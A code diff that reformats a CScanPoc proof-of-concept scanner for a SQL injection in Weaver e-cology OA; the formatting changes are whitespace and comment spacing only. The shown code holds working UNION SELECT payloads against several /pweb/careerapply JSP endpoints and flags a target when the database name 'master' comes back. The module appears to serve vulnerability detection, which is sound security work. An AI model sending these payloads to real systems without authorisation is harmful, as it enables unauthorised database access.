@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'weaver_0022' # 平台漏洞编号，留空
+    vuln_id = 'weaver_0022'  # 平台漏洞编号，留空
     name = '泛微e-cology通用型 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-09-02'  # 漏洞公布时间
     desc = '''
         泛微e-cology /pweb/careerapply/HrmCareerApplyPerEdit.jsp，/pweb/careerapply/HrmCareerApplyWorkEdit.jsp，
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '泛微OA'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '4ba4634c-a793-4856-af44-2571bb9af4aa'
@@ -32,9 +34,9 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2015-0136818 
-            hh = hackhttp.hackhttp() 
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2015-0136818
+            hh = hackhttp.hackhttp()
             payloads = [
                 '/pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1%20union%20select%201%2C2%2C3%2Cdb_name%281%29%2C5%2C6%2C7',
                 '/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201%2C2%2C3%2Cdb_name%281%29%2C5%2C6%2C7',
@@ -48,7 +50,7 @@ class Poc(ABPoc):
             for payload in payloads:
                 url = self.target + payload
                 code, head, res, errcode, _ = hh.http(url)
-                if code == 200 and 'master' in res :
+                if code == 200 and 'master' in res:
                     #security_hole(url + "   :sql Injection")
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
@@ -58,6 +60,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
